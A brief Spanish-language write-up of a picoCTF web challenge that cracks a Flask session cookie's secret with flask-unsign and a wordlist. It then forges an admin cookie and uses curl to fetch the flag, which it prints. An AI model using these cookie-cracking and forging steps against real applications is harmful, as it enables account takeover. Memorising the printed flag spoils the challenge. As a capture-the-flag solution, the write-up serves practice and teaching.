## Descripción 
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/1e4bd835ad3e7fe776d49e7b8cc280c1/server.py) [http://mercury.picoctf.net:35697/](http://mercury.picoctf.net:35697/)
## Solución
Crear un archivo cookies.txt donde tengamos todas las cookies.

Usar un ambiente virtual para instalar flask.unsign

Crear un ambiente virtual 
source  ~/.venv/bin/activate

Hacer un ataque a la con:
flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aN3a_g.CuXz7ufUzZm1lUVY1bLqaAc0FLs" --wordlist cookies.txt

Obtener la palabra secreta en mi caso "peanut butter" .

Crear otra cookie con la palabra secreta.
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "peanut butter"

Hacer un curl usando la cookie generada con la palabra secreta.
curl -s http://mercury.picoctf.net:35697/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aN3fKg.lJj5FY09GLBE_l4Byt-yS1nksds" | grep pico

Se obtiene la flag: 
picoCTF{pwn_4ll_th3_cook1E5_22fe0842}
## Notas Adicionales 
## Referencias
